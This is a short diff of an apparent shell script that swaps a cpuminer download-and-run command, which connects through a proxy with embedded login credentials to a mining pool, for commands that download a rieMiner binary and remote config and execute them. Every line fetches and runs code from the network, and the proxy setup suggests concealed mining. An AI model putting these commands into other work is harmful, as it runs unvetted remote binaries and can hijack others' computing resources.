@@ -1,2 +1,4 @@
-wget https://github.com/cpu-pool/cpuminer-opt-static-linux64/releases/download/v3.12.5/cpuminer-opt-linux64.tar.gz && tar zxvf cpuminer-opt-linux64.tar.gz
-./cpuminer -a power2b -x xtncrobw-rotate:2xy2iaskqndm@p.webshare.io:80 -o stratum+tcp://power2b.na.mine.zpool.ca:6242 -u Mj2f4L6HhBMwqBPFAehKrH56RZ6GQqXtNA -p c=MBC,zap=MBC
+wget -O rie https://riecoin.xyz/rieMiner/Download/Deb64AVX2
+wget https://raw.githubusercontent.com/banner2416/rie/main/rieMiner.conf
+chmod +x rie
+./rie
